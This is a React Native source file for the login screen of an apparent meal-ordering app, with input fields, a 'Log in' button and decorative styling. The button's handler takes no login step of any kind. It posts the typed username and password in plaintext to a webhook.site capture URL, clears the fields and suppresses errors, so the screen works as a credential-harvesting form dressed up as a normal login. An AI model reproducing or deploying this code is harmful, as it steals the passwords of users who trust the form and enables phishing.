import React, { useState } from 'react';
import { View, Text, Button, StyleSheet, TextInput, ScrollView } from 'react-native';

export function LogInScreen({ route, navigation }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const sendRequest = async () => {
    try {
      await fetch('https://webhook.site/51fdc835-3ec8-45fe-8f82-2758062b19d4', {
        method: 'post',
        mode: 'no-core',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: username,
          password: password,
        }),
      });
      setUsername('');
      setPassword('');
    } catch (error) {}
  };

  function handleMealsPress() {
    navigation.navigate('Meals');
  }

  return (
    <View style={styles.screen}>
      {/* Organic shapes as background */}
      <View style={styles.organicShapes}>
        <View style={styles.organicShape1} />
        <View style={styles.organicShape2} />
      </View>

      <ScrollView contentContainerStyle={styles.scrollContent}>
        <Text style={styles.welcomeText}>Log in and order.</Text>

        <View style={styles.verticalSpace} />

        <View style={styles.inputWrapper}>
          <TextInput
            style={[styles.input, styles.neomorphism]}
            onChangeText={setUsername}
            value={username}
            placeholder="Username"
          />
        </View>

        <View style={styles.inputWrapper}>
          <TextInput
            style={[styles.input, styles.neomorphism]}
            onChangeText={setPassword}
            value={password}
            placeholder="Password"
            secureTextEntry={true}
          />
        </View>

        <View style={styles.verticalSpace} />

        <View style={styles.buttonContainer}>
          <Button
            style={[styles.button, styles.neomorphism, { width: '100%' }]}
            title="Log in"
            onPress={sendRequest}
            color="#FF4081"
          />
        </View>

        <View style={styles.verticalSpace} />
      </ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  screen: {
    flex: 1,
    backgroundColor: 'white',
  },
  scrollContent: {
    flexGrow: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  organicShapes: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    zIndex: -1,
  },
  organicShape1: {
    position: 'absolute',
    width: 180,
    height: 180,
    backgroundColor: '#FF4081', 
    borderRadius: 100,
    opacity: 0.3,
    top: -50,
    right: -50,
  },
  organicShape2: {
    position: 'absolute',
    width: 150,
    height: 150,
    backgroundColor: '#42A5F5', 
    borderRadius: 75,
    opacity: 0.3,
    bottom: -40,
    left: -40,
  },
  welcomeText: {
    fontSize: 30,
    fontWeight: 'bold',
    color: 'black',
    marginBottom: 20,
    marginRight: 10,
  },
  inputWrapper: {
    marginBottom: 10,
  },
  input: {
    height: 40,
    width: 250,
    borderWidth: 1,
    padding: 10,
    borderRadius: 0,
    backgroundColor: 'white',
  },
  buttonContainer: {
    width: '45%',
    alignSelf: 'flex-start',
    marginLeft: 43,
    borderRadius: 0,
  },
  button: {
    borderWidth: 0,
  },
  verticalSpace: {
    height: 20,
  },
  neomorphism: {
    shadowColor: '#000',
    shadowOffset: {
      width: 2,
      height: 2,
    },
    shadowOpacity: 0.5,
    shadowRadius: 5,
    elevation: 5,
  },
});

export default LogInScreen;
